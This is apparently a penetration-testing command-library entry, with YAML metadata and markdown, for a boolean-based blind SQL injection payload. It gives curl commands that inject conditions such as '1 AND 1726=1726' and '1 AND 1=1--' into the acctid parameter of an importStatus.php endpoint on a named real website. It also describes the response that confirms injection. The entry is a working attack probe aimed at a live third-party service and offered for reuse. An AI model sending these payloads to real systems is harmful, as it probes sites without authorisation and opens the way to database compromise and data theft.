---
data: >-
  curl "https://www.intensedebate.com/js/importStatus.php?acctid=1 AND
  1726=1726"
tags:
  - sqli
  - payload
type: command
output: 'Application response indicating true condition (e.g., normal page load)'
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:05.315Z'
id: f011dc7b-bba1-408a-bee5-4b3204f6841d
verified: false
validated: true
submitted: true
---
# boolean-sqli-payload

## Command

```bash
curl "https://www.intensedebate.com/js/importStatus.php?acctid=1 AND 1726=1726"
```

## Description

Sends a boolean-based blind SQL Injection payload to test if the parameter allows query manipulation based on true/false conditions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `acctid` | Injected value appending SQL logic | Yes |

## Examples

### Basic Usage

```bash
curl "https://www.intensedebate.com/js/importStatus.php?acctid=1 AND 1726=1726"
```

### Advanced Usage

```bash
curl "https://www.intensedebate.com/js/importStatus.php?acctid=1 AND 1=1--"
```

## Expected Output

Normal application response for true condition, confirming injection.

## Related

- [[commands/time-based-sqli-payload]]
- [[procedures/Identify-Vulnerable-SQL-Injection-Parameter]]
